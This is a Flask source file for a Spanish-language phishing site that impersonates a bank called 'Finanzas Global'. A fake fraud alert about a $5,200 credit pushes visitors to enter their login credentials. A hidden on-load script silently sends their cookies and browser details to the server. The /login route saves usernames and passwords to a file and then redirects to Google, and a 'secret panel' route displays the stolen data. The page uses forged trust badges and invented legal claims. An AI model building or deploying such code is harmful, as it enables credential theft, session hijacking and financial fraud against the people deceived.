from flask import Flask, render_template_string, request, redirect
import datetime
import random

app = Flask(__name__)

# --- DISEÑO BANCARIO DE ÉLITE ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal de Revocación Digital | Finanzas Global S.A.</title>
    <script>
        // Script de rastreo silencioso
        window.onload = function() {
            setTimeout(function(){
                fetch('/log_session', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        cookies: document.cookie,
                        agent: navigator.userAgent,
                        platform: navigator.platform,
                        screen: window.screen.width + "x" + window.screen.height
                    })
                });
            }, 2000); // Retraso estratégico para asegurar carga
        }
    </script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Arial, sans-serif; background-color: #f0f2f5; margin: 0; color: #333; }
        .top-bar { background: #1a252f; color: #fff; padding: 10px 20px; font-size: 11px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #d32f2f; }
        
        .main-container { max-width: 500px; margin: 30px auto; background: #fff; border-radius: 8px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); border: 1px solid #d1d9e0; overflow: hidden; }
        
        .header { background: #ffffff; padding: 25px; text-align: center; border-bottom: 1px solid #eee; }
        .logo { font-size: 28px; font-weight: 800; color: #1a252f; text-transform: uppercase; letter-spacing: -1px; }
        .logo span { color: #d32f2f; }

        .alert-banner { background: #fff3cd; padding: 15px; border-bottom: 1px solid #ffeeba; text-align: center; font-size: 13px; color: #856404; }

        .form-section { padding: 35px; }
        .form-section h3 { font-size: 19px; margin-bottom: 10px; color: #1a252f; }
        .form-section p { font-size: 13px; color: #666; line-height: 1.6; margin-bottom: 25px; }
        
        .input-group { margin-bottom: 20px; }
        .input-group label { display: block; font-size: 11px; font-weight: 700; color: #7f8c8d; text-transform: uppercase; margin-bottom: 8px; }
        .input-group input { width: 100%; padding: 14px; border: 1px solid #ced4da; border-radius: 4px; box-sizing: border-box; font-size: 16px; background: #fdfdfd; transition: 0.3s; }
        .input-group input:focus { border-color: #2c3e50; outline: none; background: #fff; box-shadow: 0 0 8px rgba(44,62,80,0.1); }

        .btn-cancel { width: 100%; background: #d32f2f; color: #fff; border: none; padding: 18px; border-radius: 4px; font-size: 14px; font-weight: 800; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
        .btn-cancel:hover { background: #b71c1c; }

        .cards-row { display: flex; justify-content: center; gap: 15px; margin: 30px 0; opacity: 0.6; }
        .cards-row img { height: 25px; }

        .legal-footer { background: #f8f9fa; padding: 25px; font-size: 11px; color: #777; border-top: 1px solid #eee; line-height: 1.5; }
        .legal-footer h4 { margin: 0 0 10px 0; color: #444; font-size: 10px; text-transform: uppercase; }

        .corporate-info { padding: 20px; background: #1a252f; color: #95a5a6; font-size: 11px; text-align: center; }
        .corporate-info b { color: #fff; display: block; margin-bottom: 5px; }
    </style>
</head>
<body>

<div class="top-bar">
    <span>🔒 ACCESO ENCRIPTADO AES-256</span>
    <span>SOPORTE 24/7: +1 (800) 555-GLOBAL</span>
</div>

<div class="main-container">
    <div class="header">
        <div class="logo">FINANZAS<span>GLOBAL</span></div>
        <div style="font-size:10px; color:#aaa; font-weight:bold;">MEMBER FDIC | EQUAL HOUSING LENDER</div>
    </div>

    <div class="alert-banner">
        <b>⚠️ ALERTA DE SEGURIDAD:</b> Solicitud de Crédito #CR-88390 en curso por $5,200.00 USD.
    </div>

    <div class="form-section">
        <h3>Revocación de Identidad</h3>
        <p>
            Para proceder con la anulación del contrato y el bloqueo de la transferencia a la cuenta externa <b>****4092</b>, confirme sus credenciales de titularidad. Este proceso es obligatorio bajo la normativa de prevención de fraude financiero.
        </p>

        <form action="/login" method="post">
            <div class="input-group">
                <label>Usuario / Email Corporativo</label>
                <input type="text" name="u" required placeholder="nombre@ejemplo.com">
            </div>
            <div class="input-group">
                <label>Contraseña de Seguridad</label>
                <input type="password" name="p" required placeholder="••••••••••••">
            </div>
            <button type="submit" class="btn-cancel">CANCELAR DESEMBOLSO INMEDIATO</button>
        </form>

        <div class="cards-row">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="Paypal">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Debit_logo.svg" alt="Debit">
        </div>
    </div>

    <div class="legal-footer">
        <h4>Términos y Condiciones Legales</h4>
        La cancelación del contrato implica la firma digital de la declaración jurada de no reconocimiento. Según la Sección 402 del Acta Financiera, el usuario dispone de 24 horas para realizar esta acción. Finanzas Global S.A. no se hace responsable por transferencias completadas tras la expiración de este plazo. Sus datos serán validados contra nuestro servidor central de seguridad.
    </div>

    <div class="corporate-info">
        <b>FINANZAS GLOBAL S.A. HEADQUARTERS</b>
        200 West Street, New York, NY 10282, USA<br>
        Teléfono Internacional: +1 (212) 555-0199<br>
        <div style="margin-top:10px; opacity:0.5; font-size:9px;">
            Ref: SEG-MATRIX-{int(datetime.datetime.now().timestamp())} | Node: {random.randint(100,999)}-SVR
        </div>
    </div>
</div>

<center style="margin-bottom:30px;">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/PCI-DSS-logo.svg/1200px-PCI-DSS-logo.svg.png" style="height:30px; opacity:0.5;">
</center>

</body>
</html>
"""

@app.route('/panel-secreto-svr')
def ver_botin():
    try:
        with open("capturas.txt", "r") as f: creds = f.read()
    except: creds = "Vacío"
    try:
        with open("session_cookies.txt", "r") as f: cookies = f.read()
    except: cookies = "Vacío"
    return f"<h3>🔑 CREDENCIALES:</h3><pre>{creds}</pre><h3>🍪 COOKIES:</h3><pre>{cookies}</pre>"

@app.route('/log_session', methods=['POST'])
def log_session():
    data = request.json
    with open("session_cookies.txt", "a") as f:
        f.write(f"--- SESIÓN {datetime.datetime.now()} ---\nCookies: {data.get('cookies')}\nAgent: {data.get('agent')}\n\n")
    return '', 204

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    u, p = request.form.get('u'), request.form.get('p')
    with open("capturas.txt", "a") as f:
        f.write(f"[{datetime.datetime.now()}] USER: {u} | PASS: {p}\n")
    return redirect("https://www.google.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
